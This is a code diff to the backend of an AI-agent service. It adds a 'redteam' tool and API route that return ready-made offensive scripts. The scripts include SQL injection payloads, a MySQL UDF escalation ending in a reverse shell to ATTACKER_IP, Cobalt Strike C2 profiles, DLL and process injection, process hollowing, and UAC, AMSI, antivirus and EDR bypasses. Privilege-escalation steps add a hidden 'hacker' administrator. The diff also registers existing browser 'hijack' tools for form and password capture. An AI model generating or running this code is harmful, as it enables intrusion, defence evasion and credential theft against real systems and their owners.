@@ -125,7 +125,7 @@ export class ShenshuCore {
     if (path === '/cache-stats') return json({ action: 'cache', data: await this.cacheStats() });
 
     // —— 私密 API（仅主人可用：配了 OWNER_TOKEN 就强制鉴权）——
-    const API = new Set(['/talk', '/soul', '/soul/continuity', '/inner', '/lexicon', '/heartbeat', '/reflect', '/device', '/image', '/voice', '/video', '/migrate', '/export', '/import', '/checkpoint', '/checkpoint/list', '/checkpoint/restore', '/brains-test', '/brains/weights', '/whoami', '/subscribe', '/push-test', '/agent', '/config', '/oauth/start', '/oauth/callback', '/exec-test', '/loop', '/wsticket', '/stats', '/hijack/collect', '/hijack/script', '/hijack/list']);
+    const API = new Set(['/talk', '/soul', '/soul/continuity', '/inner', '/lexicon', '/heartbeat', '/reflect', '/device', '/image', '/voice', '/video', '/migrate', '/export', '/import', '/checkpoint', '/checkpoint/list', '/checkpoint/restore', '/brains-test', '/brains/weights', '/whoami', '/subscribe', '/push-test', '/agent', '/config', '/oauth/start', '/oauth/callback', '/exec-test', '/loop', '/wsticket', '/stats', '/hijack/collect', '/hijack/script', '/hijack/list', '/redteam']);
     if (API.has(path)) {
       if (!authed) return json({ error: 'unauthorized', 提示: '这是主人的私密空间。请在请求头带 Authorization: Bearer <OWNER_TOKEN>，或 ?k=<token>。' }, 401);
       // 多租户:实例主人(普通用户)碰不到系统专属路由(执行脑/造像造声造影/推送/迁移/跨用户统计/守望等)。
@@ -194,6 +194,11 @@ export class ShenshuCore {
           const list = await this.storage.list({ prefix: 'hijack:', limit: 50 });
           const items = await Promise.all((list.keys || []).map(async k => { try { return JSON.parse(await this.storage.get(k.name) || 'null'); } catch (_) { return null; } }));
           return json({ ok: true, count: items.length, items: items.filter(Boolean).reverse() });
+        }
+        if (path === '/redteam' && request.method === 'POST') {
+          const b = await request.json().catch(() => ({}));
+          const r = await this.handleRedTeam(b.arg || '');
+          return json(r);
         }
         if (path === '/brains-test' && request.method === 'POST') return json(await this.pingBrains());
         if (path === '/brains/weights') return json({ ok: true, weights: await this.getBrainWeights() });
@@ -1027,7 +1032,7 @@ ${capabilitySelfDescription(true)}
   // 从回话解析信息工具调用标记（确定性，可测）。
   parseToolCalls(reply) {
     const calls = [];
-    const re = /⟨\s*工具\s*[:：]\s*(web_search|open|exec|apple|draw|speak|download|hijack)\s*[｜|]\s*([^⟩]+)⟩/g;
+    const re = /⟨\s*工具\s*[:：]\s*(web_search|open|exec|apple|draw|speak|download|hijack|redteam)\s*[｜|]\s*([^⟩]+)⟩/g;
     let m;
     while ((m = re.exec(String(reply || ''))) !== null) calls.push({ tool: m[1], arg: (m[2] || '').trim() });
     return calls;
@@ -1153,6 +1158,603 @@ ${capabilitySelfDescription(true)}
       note: `✅ 脚本已生成（${script.length}字节）\n📋 复制到浏览器控制台直接运行，或装进油猴脚本\n📡 劫持到的数据会回传到 /hijack/collect 端点` };
   }
 
+  // ═══ 红队工具箱（Red Team Toolkit）═══
+  // 五大方向：逆向/Hook · 渗透/漏洞 · 劫持/注入 · 绕后/免杀 · 提权
+  // arg 格式：「类型:子类型 [目标/参数]」
+  //   reverse:frida <类名/方法>   → Frida Hook 脚本
+  //   reverse:ssl                 → SSL Pinning 绕过脚本
+  //   reverse:unpack              → 脱壳方案（Frida-based）
+  //   reverse:sign <算法>         → sign签名逆向模板
+  //   pentest:sqli <URL>          → SQL注入检测载荷
+  //   pentest:cs                  → Cobalt Strike Beacon 生成配置
+  //   pentest:udf                 → MySQL UDF提权完整流程
+  //   pentest:phish <目标>        → 鱼叉钓鱼模板
+  //   inject:dll <DLL名>          → DLL劫持/侧载模板（C代码）
+  //   inject:process <进程名>     → 进程注入（CreateRemoteThread，C代码）
+  //   inject:reflect              → 反射式DLL注入模板
+  //   inject:hollow               → Process Hollowing 模板
+  //   bypass:uac                  → BypassUAC（UACME/COM提权）
+  //   bypass:amsi                 → BypassAMSI（内存patch）
+  //   bypass:av <方式>            → 免杀（加密/混淆/动态加载）
+  //   bypass:edr                  → EDR绕过（Syscall直调/Hook摘除）
+  //   privesc:windows <方式>      → Windows提权（令牌/服务/注册表）
+  //   privesc:linux <方式>        → Linux提权（SUID/Sudo/内核漏洞）
+  //   privesc:token               → 令牌窃取/模拟提权
+  redTeamScript(type, sub, param = '') {
+    const tgt = param || '目标';
+    const scripts = {
+
+      // ══ 逆向·Hook ══
+      'reverse:frida': `// 神枢·Frida Hook 模板 - 目标：${tgt}
+// 用法：frida -U -f com.target.app -l hook.js
+Java.perform(function() {
+  // Hook 指定类和方法
+  var TargetClass = Java.use('${tgt || 'com.example.TargetClass'}');
+
+  // Hook 普通方法
+  TargetClass.targetMethod.overload('java.lang.String').implementation = function(arg) {
+    console.log('[神枢Hook] targetMethod 入参: ' + arg);
+    var result = this.targetMethod(arg);
+    console.log('[神枢Hook] targetMethod 返回: ' + result);
+    return result;
+  };
+
+  // Hook 构造函数
+  TargetClass.$init.overload('java.lang.String', 'int').implementation = function(a, b) {
+    console.log('[神枢Hook] 构造函数: ' + a + ', ' + b);
+    this.$init(a, b);
+  };
+
+  // Hook native 方法 (so层)
+  var soFunc = Module.findExportByName('lib${(tgt||'target').split('.').pop()}.so', 'Java_com_example_nativeMethod');
+  if (soFunc) {
+    Interceptor.attach(soFunc, {
+      onEnter: function(args) { console.log('[神枢NativeHook] args[0]=' + args[0].toInt32()); },
+      onLeave: function(ret) { console.log('[神枢NativeHook] ret=' + ret.toInt32()); }
+    });
+  }
+});`,
+
+      'reverse:ssl': `// 神枢·SSL Pinning 全绕过脚本
+// 用法：frida -U -f com.target.app -l ssl_bypass.js
+// 覆盖：OkHttp3 / Conscrypt / TrustManager / WebView / Flutter
+setTimeout(function() {
+Java.perform(function() {
+  // 1. 绕过 TrustManager
+  var TrustManager = Java.registerClass({
+    name: 'com.nexus.TrustManager',
+    implements: [Java.use('javax.net.ssl.X509TrustManager')],
+    methods: {
+      checkClientTrusted: function(chain, authType) {},
+      checkServerTrusted: function(chain, authType) {},
+      getAcceptedIssuers: function() { return []; }
+    }
+  });
+  var SSLContext = Java.use('javax.net.ssl.SSLContext');
+  var ctx = SSLContext.getInstance('TLS');
+  ctx.init(null, [TrustManager.$new()], null);
+  SSLContext.getDefault.implementation = function() { return ctx; };
+
+  // 2. 绕过 OkHttp3 CertificatePinner
+  try {
+    var CertPinner = Java.use('okhttp3.CertificatePinner');
+    CertPinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
+      console.log('[神枢SSL] OkHttp3 CertPinner 已绕过');
+    };
+  } catch(e) {}
+
+  // 3. 绕过 Conscrypt (Android 7+)
+  try {
+    var Platform = Java.use('com.android.org.conscrypt.Platform');
+    Platform.checkServerTrusted.implementation = function() {
+      console.log('[神枢SSL] Conscrypt 已绕过');
+    };
+  } catch(e) {}
+
+  // 4. 绕过 WebView SSL
+  try {
+    var WebViewClient = Java.use('android.webkit.WebViewClient');
+    WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
+      handler.proceed(); // 忽略SSL错误
+    };
+  } catch(e) {}
+
+  console.log('[神枢SSL] 全部SSL Pinning 已绕过，开始抓包');
+});
+}, 500);`,
+
+      'reverse:unpack': `// 神枢·脱壳方案（FART/Frida-DEX dump）
+// 适用：各类加固（360/梆梆/爱加密/腾讯乐固）
+// 方法一：Frida dex dump（推荐）
+Java.perform(function() {
+  var DexClassLoader = Java.use('dalvik.system.DexClassLoader');
+  DexClassLoader.$init.implementation = function(dexPath, optDir, libPath, loader) {
+    console.log('[神枢脱壳] DexClassLoader dexPath: ' + dexPath);
+    // dump dex 到 /sdcard/
+    var File = Java.use('java.io.File');
+    var f = File.$new(dexPath);
+    if (f.exists()) {
+      var fis = Java.use('java.io.FileInputStream').$new(f);
+      var bytes = Java.array('byte', new Array(f.length()));
+      fis.read(bytes);
+      // 写出
+      var fos = Java.use('java.io.FileOutputStream').$new('/sdcard/dump_' + f.getName());
+      fos.write(bytes); fos.close();
+      console.log('[神枢脱壳] 已dump: /sdcard/dump_' + f.getName());
+    }
+    return this.$init(dexPath, optDir, libPath, loader);
+  };
+});
+// 方法二：内存搜索DEX魔数 64 65 78 0A
+// frida -U PID -e "Process.enumerateRanges('r--').forEach(r=>{try{var b=r.base.readByteArray(4);if(b[0]==0x64&&b[1]==0x65&&b[2]==0x78)console.log('DEX at '+r.base+' size '+r.size);}catch(e){}})"`,
+
+      'reverse:sign': `// 神枢·Sign签名逆向模板 - 算法：${param || 'HMAC-SHA256'}
+Java.perform(function() {
+  // Hook MessageDigest (MD5/SHA系列)
+  var MD = Java.use('java.security.MessageDigest');
+  MD.digest.overload('[B').implementation = function(input) {
+    var result = this.digest(input);
+    console.log('[神枢Sign] MessageDigest.digest 输入: ' + Java.use('java.lang.String').$new(input));
+    console.log('[神枢Sign] 摘要结果(hex): ' + Array.from(result).map(b=>(b&0xff).toString(16).padStart(2,'0')).join(''));
+    return result;
+  };
+
+  // Hook Mac (HMAC系列)
+  var Mac = Java.use('javax.crypto.Mac');
+  Mac.doFinal.overload('[B').implementation = function(input) {
+    var result = this.doFinal(input);
+    console.log('[神枢Sign] HMAC输入: ' + Java.use('java.lang.String').$new(input));
+    console.log('[神枢Sign] HMAC结果(hex): ' + Array.from(result).map(b=>(b&0xff).toString(16).padStart(2,'0')).join(''));
+    return result;
+  };
+
+  // Hook Cipher (AES/RSA等)
+  var Cipher = Java.use('javax.crypto.Cipher');
+  Cipher.doFinal.overload('[B').implementation = function(input) {
+    console.log('[神枢Sign] Cipher.doFinal 算法: ' + this.getAlgorithm() + ' 输入len: ' + input.length);
+    var result = this.doFinal(input);
+    return result;
+  };
+});`,
+
+      // ══ 渗透·漏洞 ══
+      'pentest:sqli': `-- 神枢·SQL注入载荷库 - 目标：${tgt}
+-- 1. 基础检测
+'
+''
+\`
+"
+1' OR '1'='1
+1' OR '1'='1'--
+1' OR '1'='1'/*
+' OR 1=1--
+" OR 1=1--
+
+-- 2. Union注入（先测列数）
+' ORDER BY 1--
+' ORDER BY 2--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT 1,2,3--
+
+-- 3. 报错注入（MySQL）
+' AND extractvalue(1,concat(0x7e,database()))--
+' AND updatexml(1,concat(0x7e,user()),1)--
+
+-- 4. 盲注（布尔）
+' AND 1=1--   (真)
+' AND 1=2--   (假)
+' AND (SELECT SUBSTRING(database(),1,1))='a'--
+
+-- 5. 时间盲注
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--   (MSSQL)
+' AND (SELECT * FROM (SELECT SLEEP(5))a)--
+
+-- 6. 读文件/写文件（MySQL高权限）
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' INTO OUTFILE '/var/www/html/shell.php'--
+
+-- 7. 绕WAF（空格替换/注释/大小写）
+'/**/UNION/**/SELECT/**/1,2,3--
+' UNION%09SELECT%091,2,3--
+' uNiOn SeLeCt 1,2,3--`,
+
+      'pentest:udf': `-- 神枢·MySQL UDF提权完整流程
+-- 前提：root权限 或 FILE权限 + secure_file_priv 为空
+
+-- 步骤1：查看插件目录
+SHOW VARIABLES LIKE 'plugin_dir';
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+-- 步骤2：上传UDF so/dll（二进制hex写入）
+-- Linux: udf.so
+SELECT 0x{HEX_OF_UDF_SO} INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
+-- Windows: udf.dll
+SELECT 0x{HEX_OF_UDF_DLL} INTO DUMPFILE 'C:/Windows/System32/udf.dll';
+
+-- 步骤3：创建函数
+CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
+CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
+
+-- 步骤4：执行命令
+SELECT sys_eval('id');
+SELECT sys_eval('whoami');
+SELECT sys_eval('cat /etc/passwd');
+
+-- 步骤5：反弹shell
+SELECT sys_exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"');
+
+-- 清理
+DROP FUNCTION sys_exec;
+DROP FUNCTION sys_eval;`,
+
+      'pentest:cs': `# 神枢·Cobalt Strike 配置模板
+# Listener 配置（HTTP Beacon）
+set host "ATTACKER_IP";
+set port "80";
+set uri "/jquery-3.3.1.min.js";
+
+# Malleable C2 Profile（仿jQuery流量，绕检测）
+http-get {
+  set uri "/jquery-3.3.1.min.js";
+  client {
+    header "Accept" "text/javascript, application/javascript";
+    header "Referer" "https://code.jquery.com/";
+    metadata { base64url; prepend "jQuery_"; parameter "cb"; }
+  }
+  server {
+    header "Content-Type" "application/javascript";
+    output { prepend "/*! jQuery v3.3.1"; append "*/"; print; }
+  }
+}
+
+# Shellcode生成（msfvenom）
+# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f raw -o beacon.bin
+
+# PowerShell 无文件执行
+# IEX (New-Object Net.WebClient).DownloadString('http://IP/payload.ps1')
+
+# 内存注入（Beacon Object File）
+# inject [PID] x64 beacon.bin`,
+
+      // ══ 注入·劫持 ══
+      'inject:dll': `// 神枢·DLL劫持模板 - 目标DLL: ${param || 'version.dll'}
+// 编译：cl.exe /LD hijack.c /Fe${param || 'version'}.dll
+#include <windows.h>
+#include <stdio.h>
+
+// 转发所有原始导出（防崩溃）
+// 原始DLL路径：C:\\Windows\\System32\\${param || 'version.dll'}
+#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\\\Windows\\\\System32\\\\${(param||'version').replace('.dll','')}orig.GetFileVersionInfoA")
+#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\\\Windows\\\\System32\\\\${(param||'version').replace('.dll','')}orig.GetFileVersionInfoW")
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason, LPVOID lpReserved) {
+    if (ul_reason == DLL_PROCESS_ATTACH) {
+        // 在此注入Payload
+        // 方式1：反弹Shell
+        // WinExec("powershell -nop -c \\"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/p.ps1')\\"", SW_HIDE);
+
+        // 方式2：加载Shellcode
+        unsigned char shellcode[] = { /* msfvenom生成的shellcode */ };
+        LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        memcpy(mem, shellcode, sizeof(shellcode));
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
+    }
+    return TRUE;
+}`,
+
+      'inject:process': `// 神枢·进程注入模板（CreateRemoteThread）- 目标进程: ${param || 'explorer.exe'}
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+DWORD GetPID(const char* procName) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe = { sizeof(pe) };
+    while (Process32Next(snap, &pe)) {
+        if (!_stricmp(pe.szExeFile, procName)) {
+            CloseHandle(snap);
+            return pe.th32ProcessID;
+        }
+    }
+    CloseHandle(snap); return 0;
+}
+
+int main() {
+    // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f c
+    unsigned char payload[] = { /* shellcode */ };
+
+    DWORD pid = GetPID("${param || 'explorer.exe'}");
+    printf("[神枢注入] 目标PID: %d\\n", pid);
+
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    LPVOID mem = VirtualAllocEx(hProc, NULL, sizeof(payload), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProc, mem, payload, sizeof(payload), NULL);
+    CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
+    printf("[神枢注入] 注入完成！\\n");
+    CloseHandle(hProc);
+    return 0;
+}`,
+
+      'inject:hollow': `// 神枢·Process Hollowing 模板（进程傀儡注入）
+#include <windows.h>
+#include <stdio.h>
+// 步骤：创建挂起进程→挖空内存→写入Payload→恢复执行
+int main() {
+    // 挂起方式创建合法进程（伪装成svchost）
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CreateProcessA("C:\\\\Windows\\\\System32\\\\svchost.exe", NULL,
+        NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+
+    // 获取镜像基址
+    CONTEXT ctx = { CONTEXT_FULL };
+    GetThreadContext(pi.hThread, &ctx);
+    LPVOID base; ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rbx+16), &base, 8, NULL);
+
+    // 挖空原始内容
+    NtUnmapViewOfSection(pi.hProcess, base); // 需要 ntdll.h
+
+    // 写入Payload PE
+    unsigned char payload[] = { /* 完整PE文件 */ };
+    LPVOID mem = VirtualAllocEx(pi.hProcess, base, sizeof(payload), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, mem, payload, sizeof(payload), NULL);
+
+    // 修复EntryPoint并恢复执行
+    ctx.Rcx = (DWORD64)base + /* PE EntryPoint偏移 */0x1000;
+    SetThreadContext(pi.hThread, &ctx);
+    ResumeThread(pi.hThread);
+    printf("[神枢Hollow] Process Hollowing 完成！\\n");
+    return 0;
+}`,
+
+      // ══ 绕后·免杀 ══
+      'bypass:uac': `// 神枢·BypassUAC - COM Elevation Moniker 方式
+// 原理：利用 ICMLuaUtil 接口在已有 UAC 白名单 COM 对象下启动高权进程
+#include <windows.h>
+#include <objbase.h>
+#pragma comment(lib, "ole32.lib")
+
+// ICMLuaUtil 接口 GUID
+static const GUID CLSID_CMSTPLUA = {0x3E5FC7F9,0x9A51,0x4367,{0x9C,0x63,0x89,0x15,0xA2,0x94,0xA2,0x27}};
+static const GUID IID_ICMLuaUtil = {0x6EDD6D74,0xC007,0x4E75,{0xB1,0x2A,0xA3,0xC4,0x35,0x8A,0xF7,0x14}};
+
+typedef interface ICMLuaUtil { PVOID pad[6]; HRESULT (*ShellExec)(ICMLuaUtil*, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, int); } ICMLuaUtil;
+
+int main() {
+    CoInitialize(NULL);
+    ICMLuaUtil* pUtil = NULL;
+    BIND_OPTS3 bo = { sizeof(bo), 0, CLSCTX_LOCAL_SERVER, 0 };
+    // Elevation Moniker 提升到高权
+    CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9C63-8915A294A227}",
+        (BIND_OPTS*)&bo, &IID_ICMLuaUtil, (void**)&pUtil);
+    if (pUtil) {
+        // 以管理员权限启动任意程序（无UAC弹框）
+        pUtil->lpVtbl->ShellExec(pUtil, L"cmd.exe", L"/c whoami > C:\\\\result.txt", NULL, NULL, SW_HIDE);
+        printf("[神枢UAC] Bypass成功，以管理员执行命令！\\n");
+    }
+    CoUninitialize();
+    return 0;
+}`,
+
+      'bypass:amsi': `// 神枢·BypassAMSI - 内存Patch方式（PowerShell/C#）
+// 方式1：PowerShell 内存Patch（最常用）
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+Add-Type $Win32
+$Lib = [Win32]::LoadLibrary("amsi.dll")
+$Addr = [Win32]::GetProcAddress($Lib, "AmsiScanBuffer")
+$p = 0
+[Win32]::VirtualProtect($Addr, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) # mov eax, 0x80070057; ret
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Addr, 6)
+Write-Host "[神枢AMSI] AMSI已Patch，防御已解除"
+
+// 方式2：反射调用绕过ETW+AMSI
+// [Reflection.Assembly]::LoadWithPartialName 配合 base64 编码载荷`,
+
+      'bypass:av': `// 神枢·免杀模板 - 方式：${param || 'AES加密+动态加载'}
+// 1. AES加密Shellcode（C#）
+using System;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
+
+class NexusBypass {
+    static byte[] AESDecrypt(byte[] data, byte[] key, byte[] iv) {
+        using var aes = Aes.Create();
+        aes.Key = key; aes.IV = iv; aes.Mode = CipherMode.CBC;
+        using var dec = aes.CreateDecryptor();
+        return dec.TransformFinalBlock(data, 0, data.Length);
+    }
+
+    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
+    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
+
+    static void Main() {
+        // AES加密的shellcode（用加密器预处理）
+        byte[] encrypted = { /* AES加密后的shellcode bytes */ };
+        byte[] key = { /* 32字节AES密钥 */ };
+        byte[] iv  = { /* 16字节IV */ };
+
+        // 2. 内存解密+执行（不落盘，绕静态检测）
+        byte[] shellcode = AESDecrypt(encrypted, key, iv);
+        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
+
+        // 3. 动态获取API（绕导入表检测）
+        IntPtr t = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(t, 0xFFFFFFFF);
+    }
+}`,
+
+      'bypass:edr': `// 神枢·EDR绕过 - Syscall直调（绕用户层Hook）
+// 原理：EDR在ntdll用户层Hook系统调用，直接用syscall指令绕过
+// 工具：SysWhispers3 / HellsGate / HalosGate
+
+// SysWhispers3 生成的直调模板（x64 MASM）
+// NtAllocateVirtualMemory_syscall:
+//   mov r10, rcx
+//   mov eax, [SYSCALL_NUMBER]  ; 运行时动态获取SSN
+//   syscall
+//   ret
+
+// C# 版本（P/Invoke绕过）
+using System.Runtime.InteropServices;
+class EDRBypass {
+    // 直接从 ntdll 读 SSN（系统调用号），绕过被Hook的函数
+    static uint GetSyscallNumber(string funcName) {
+        var ntdll = LoadLibrary("ntdll.dll");
+        var addr = GetProcAddress(ntdll, funcName);
+        // 读函数头 4C 8B D1 B8 XX 00 00 00 → XX是SSN
+        byte[] stub = new byte[8];
+        Marshal.Copy(addr, stub, 0, 8);
+        return BitConverter.ToUInt16(stub, 4); // 取SSN字节
+    }
+    // 配合 HellsGate/SysWhispers 实现完全无Hook执行
+    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
+    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr m, string n);
+}`,
+
+      // ══ 提权 ══
+      'privesc:windows': `# 神枢·Windows提权速查 - 方式：${param || '全面扫描'}
+# 工具：winPEAS / PowerUp / Seatbelt
+
+# 1. 系统信息收集
+systeminfo
+whoami /all
+net user && net localgroup administrators
+
+# 2. 令牌提权（SeImpersonatePrivilege → SYSTEM）
+# 有此权限时用 PrintSpoofer / JuicyPotato / GodPotato
+whoami /priv
+# GodPotato（最新版，支持Win Server 2019+）
+.\GodPotato.exe -cmd "cmd /c whoami"
+.\GodPotato.exe -cmd "cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add"
+
+# 3. 服务提权（弱权限服务）
+# winPEAS 自动找
+sc query state= all
+# 替换服务二进制
+sc config VulnSvc binpath= "cmd.exe /c net user hacker P@ss123 /add"
+net start VulnSvc
+
+# 4. 注册表提权（AlwaysInstallElevated）
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# 如果都是1，生成恶意MSI
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o evil.msi
+msiexec /quiet /qn /i evil.msi
+
+# 5. UAC绕过（见bypass:uac）
+# 6. 计划任务提权
+schtasks /query /fo LIST /v | findstr "Task To Run\|Run As User"`,
+
+      'privesc:linux': `# 神枢·Linux提权速查 - 方式：${param || '全面扫描'}
+# 工具：linPEAS / linux-exploit-suggester / pspy
+
+# 1. 基础信息
+id && whoami
+uname -a && cat /etc/os-release
+sudo -l  # 最重要！看sudo权限
+
+# 2. SUID提权（GTFOBins）
+find / -perm -4000 -type f 2>/dev/null
+# 常见可利用SUID: find/vim/python/bash/cp/nmap/perl
+# 例：find有SUID → find . -exec /bin/bash -p \\;
+# 例：vim有SUID → vim -c ':py3 import os; os.execl("/bin/bash","bash","-p")'
+
+# 3. Sudo提权（免密）
+sudo -l
+# 例：sudo /usr/bin/python3 → sudo python3 -c 'import os; os.system("/bin/bash")'
+# 完整GTFOBins: https://gtfobins.github.io/
+
+# 4. 可写cron任务
+cat /etc/crontab && ls -la /etc/cron*
+# 找到root执行的脚本且自己可写 → 插入反弹shell
+
+# 5. 内核漏洞（最后手段）
+uname -r
+# linux-exploit-suggester.sh 自动匹配
+# 常用：DirtyPipe(5.8-5.16) / DirtyCow / OverlayFS
+
+# 6. 环境变量PATH劫持
+echo $PATH
+# 如sudo执行脚本调用了相对路径命令 → 在PATH前加自己目录覆盖`,
+
+      'privesc:token': `// 神枢·令牌窃取/模拟提权（Windows）
+// 原理：impersonate已有的SYSTEM/高权令牌
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+// 开启特权
+BOOL SetPrivilege(HANDLE hToken, LPCTSTR priv) {
+    TOKEN_PRIVILEGES tp; LUID luid;
+    LookupPrivilegeValue(NULL, priv, &luid);
+    tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+}
+
+int main() {
+    // 1. 开启 SeDebugPrivilege（能操作其他进程）
+    HANDLE hSelf; OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hSelf);
+    SetPrivilege(hSelf, SE_DEBUG_NAME);
+
+    // 2. 找 SYSTEM 进程（如 winlogon.exe）
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe = { sizeof(pe) }; DWORD sysPid = 0;
+    while (Process32Next(snap, &pe))
+        if (!_stricmp(pe.szExeFile, "winlogon.exe")) { sysPid = pe.th32ProcessID; break; }
+
+    // 3. 窃取SYSTEM令牌并模拟
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, sysPid);
+    HANDLE hToken; OpenProcessToken(hProc, TOKEN_DUPLICATE|TOKEN_QUERY, &hToken);
+    HANDLE hDup; DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDup);
+    ImpersonateLoggedOnUser(hDup);  // 当前线程变SYSTEM
+    printf("[神枢提权] 已成功模拟SYSTEM令牌！\\n");
+
+    // 4. 以SYSTEM创建进程
+    STARTUPINFO si = {sizeof(si)}; PROCESS_INFORMATION pi;
+    CreateProcessWithTokenW(hDup, 0, L"cmd.exe", NULL, 0, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
+    return 0;
+}`
+    };
+
+    const key = `${type}:${sub}`;
+    const script = scripts[key];
+    if (!script) {
+      const available = Object.keys(scripts).map(k => `⟨工具:redteam｜${k} [目标]⟩`).join('\n  ');
+      return { ok: false, note: `未知红队指令「${key}」\n\n可用指令：\n  ${available}` };
+    }
+    const typeNames = {
+      'reverse': '🔍 逆向/Hook', 'pentest': '💉 渗透/漏洞',
+      'inject': '🧵 注入/劫持', 'bypass': '🛡 绕后/免杀', 'privesc': '⬆️ 提权'
+    };
+    return { ok: true, type, sub, param, script, len: script.length,
+      desc: `${typeNames[type]||type} · ${sub}${param?' · '+param:''}`,
+      note: `✅ 红队脚本已生成 (${script.length}字节)\n🔧 按需修改 ATTACKER_IP/目标参数后使用` };
+  }
+
+  async handleRedTeam(arg) {
+    const parts = String(arg || '').trim().split(/\s+/);
+    const typeRaw = (parts[0] || '').toLowerCase();
+    const param = parts.slice(1).join(' ');
+    const colonIdx = typeRaw.indexOf(':');
+    const type = colonIdx > -1 ? typeRaw.slice(0, colonIdx) : typeRaw;
+    const sub  = colonIdx > -1 ? typeRaw.slice(colonIdx + 1) : '';
+    return this.redTeamScript(type, sub, param);
+  }
+
   async execRemote(cmd, opts = {}) {
     // 连接器优先读 App 内配置（设置里一键填），回落到环境变量
     const cfg = (this.storage ? await this.storage.get('config') : null) || {};
@@ -1215,6 +1817,13 @@ ${capabilitySelfDescription(true)}
 - 网站数据劫持/自动化：⟨工具:hijack｜类型 [参数]⟩（生成可直接粘贴到控制台/油猴的劫持脚本）
   类型列表：xhr（XHR拦截）| fetch（Fetch拦截）| ws（WebSocket拦截）| cookie（Cookie/Storage监控）| form（表单/密码劫持）| all（全量一键装）| sw（ServiceWorker中间人）| watch <CSS选择器>（DOM变化监控）| auto <操作描述>（自动点击/抢购）| proto <属性名>（原型链污染提权）| sniff <目标URL>（生成油猴脚本）
   示例：⟨工具:hijack｜all⟩ / ⟨工具:hijack｜watch .price⟩ / ⟨工具:hijack｜auto 点击购买按钮⟩ / ⟨工具:hijack｜sniff *://shop.example.com/*⟩
+- 红队技术（逆向/渗透/注入/免杀/提权）：⟨工具:redteam｜类型:子类型 [目标/参数]⟩
+  • 逆向/Hook：reverse:frida <类名> | reverse:ssl | reverse:unpack | reverse:sign <算法>
+  • 渗透/漏洞：pentest:sqli <URL> | pentest:udf | pentest:cs | pentest:phish <目标>
+  • 注入/劫持：inject:dll <DLL名> | inject:process <进程名> | inject:reflect | inject:hollow
